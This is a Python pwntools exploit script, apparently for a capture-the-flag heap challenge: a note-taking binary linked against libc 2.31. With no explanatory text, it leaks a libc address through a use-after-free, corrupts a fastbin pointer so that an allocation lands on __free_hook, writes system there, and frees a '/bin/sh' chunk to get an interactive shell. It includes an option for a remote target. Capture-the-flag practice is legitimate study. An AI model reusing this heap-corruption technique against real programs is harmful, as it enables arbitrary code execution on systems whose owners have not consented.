from pwn import *
elf = ELF("chall_patched")
context.log_level = "debug"
context.arch = 'x86_64'
libc = ELF("libc-2.31.so")
# ip,port = "20.55.48.101" ,1339

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def add(content):
    sla("choice\n", "1")
    sla("note\n", content)

def delete(idx):
    sla("choice\n", "2")
    sla("delete?\n", str(idx))
def edit(idx, content):
    sla("choice\n", "3")
    sla("edit?\n", str(idx))
    sl(content)
def show(idx):
    sla("choice\n", "4")
    sla("read?\n", str(idx))

def add_large(content):
    sla("choice\n", "10")
    sla("note\n", str(content))

add("A")
add("B")
add_large("C")
add("D")
add_large("E")
add("F")

delete(3)

show(3)
libc_leak = u64(r.recv(6).ljust(8, b"\x00"))
libc.address = libc_leak - 0x1ebbe0
print(hex(libc.address))

one_gadget = libc.address + 0xe6ef0
malloc_hook = libc.sym["__malloc_hook"]
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
print(hex(malloc_hook))

# allocate 9 
add("1")
add("2")
add("3")
add("4")
add("5")
add("6")
add("7")
add("8")
add("9")

# free 7 - 13
delete(7)
delete(8)
delete(9)
delete(10)
delete(11)
delete(12)
delete(13)

# now fastbin 14-15
delete(14)
delete(15)

libc_environ = libc.symbols["environ"]
fgets = elf.got["fgets"]
edit(15, p64(free_hook-16))

add(b"/bin/sh\x00")
add(b"/bin/sh\x00")
add(b"/bin/sh\x00")
add(b"/bin/sh\x00")
add(b"/bin/sh\x00")
add(b"/bin/sh\x00")
add(b"/bin/sh\x00")

add(b"/bin/sh\x00")
add(p64(system))
delete(10)

r.interactive()
